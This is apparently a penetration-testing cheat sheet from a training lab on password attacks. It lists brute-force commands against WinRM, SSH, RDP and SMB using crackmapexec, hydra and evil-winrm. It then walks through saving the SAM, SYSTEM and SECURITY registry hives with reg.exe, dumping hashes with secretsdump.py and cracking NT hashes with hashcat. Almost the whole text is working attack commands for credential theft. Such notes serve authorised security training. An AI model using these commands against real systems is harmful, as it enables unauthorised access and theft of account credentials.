# Password Attacks
## Network Services
* crackmapexex (mssql, smb, ssh, winrm)
<pre>
<b># WinRM</b>
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password

<b># SSH</b>
hydra -L user.list -P password.list ssh://10.129.42.197
ssh user@10.129.42.197

<b># RDP</b>
hydra -L user.list -P password.list rdp://10.129.42.197
xfreerdp /v:<target-IP> /u:<username> /p:<password>
xfreerdp /v:10.129.42.197 /u:user /p:password

<b># SMB</b>
hydra -L user.list -P password.list smb://10.129.42.197
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
</pre>
## Attacking SAM
### Info
There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:  
|Registry Hive|Description|
|------------|------------|
|hklm\sam|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|hklm\system|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|hklm\security|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
We can create backups of these hives using the reg.exe utility.  
### Dumping registry hives and copy them to attack machine
Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:  
<pre>
# Using reg.exe save to Copy Registry Hives
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
</pre>
Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host (e.g. through SMB or HTTP).  
### Dumping hashes offline
<pre>
<b># secretsdump.py</b>
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
</pre>
### Cracking hashes with hashcat
**Copy just the nt hashes to the hashes.txt file!!!!**
<pre>
$ sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
</pre>
